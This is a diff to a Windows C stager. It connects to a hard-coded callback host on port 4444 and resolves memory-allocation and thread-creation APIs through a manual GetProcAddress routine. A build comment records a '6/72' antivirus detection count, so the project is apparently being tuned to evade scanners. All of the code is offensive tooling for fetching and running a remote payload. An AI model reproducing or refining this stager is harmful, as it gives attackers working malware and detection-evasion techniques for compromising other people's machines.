@@ -9,16 +9,14 @@
  * x86_64-w64-mingw32-gcc -nostdlib -nostartfiles -s -Wl,--entry=main -Wl,--strip-all stager.c -o stager.exe
  * 
  * // Working flags below, 6/72
- * x86_64-w64-mingw32-gcc -s -Wl,--entry=main -Wl,--strip-all stager.c -o stager.exe
+ * x86_64-w64-mingw32-gcc -s -Wl,--entry=main -Wl,--strip-all stager.c -o stager.exe -lws2_32
  * */
 
 // TODO: eventually convert to c code then asm then shell code?
 
 //#include "stager.h"
-//#include "../utils/utils.h"
 
-#include <ws2tcpip.h>
-#include <winsock2.h> // needed by socket and connect?
+//#include <winsock2.h> // needed by socket and connect?
 #include "../utils/winsock_util.h"
 //#include "payload_util.h"
 #include "../utils/utils.h"
@@ -39,17 +37,10 @@ int run(const char* host, const char* port)
     // 1. manually resolve apis (skip for now and just include the headers that import it)
 
 	// TODO: hash these string literals 
-    // TODO: maybe try using regular GetProcAddress to see if everything works then try to use GetProcAddressManual
-	/*
     FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)GetProcAddressManual("kernel32.dll", "VirtualAlloc");
     FuncVirtualProtect pVirtualProtect = (FuncVirtualProtect)GetProcAddressManual("kernel32.dll", "VirtualProtect");
     FuncCreateThread pCreateThread = (FuncCreateThread)GetProcAddressManual("kernel32.dll", "CreateThread");
 	FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)GetProcAddressManual("kernel32.dll", "WaitForSingleObject");
-	*/
-    FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
-    FuncVirtualProtect pVirtualProtect = (FuncVirtualProtect)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect");
-    FuncCreateThread pCreateThread = (FuncCreateThread)GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateThread");
-    FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)GetProcAddress(GetModuleHandle("kernel32.dll"), "WaitForSingleObject");
 
 	/*
     FuncWSAStartup pWSAStartup = (FuncWSAStartup)GetProcAddressManual("ws2_32.dll", "WSAStartup");
@@ -213,8 +204,8 @@ int main()
     //Stager tcpStager;
     //tcpStager.run("172.18.245.234", "4444");
     //tcpStager.run("10.0.0.86", "4444");
-    //run("172.18.245.234", "4444");
-    run("10.0.0.86", "4444");
+    run("172.18.245.234", "4444");
+    //run("10.0.0.86", "4444");
 }
 
 
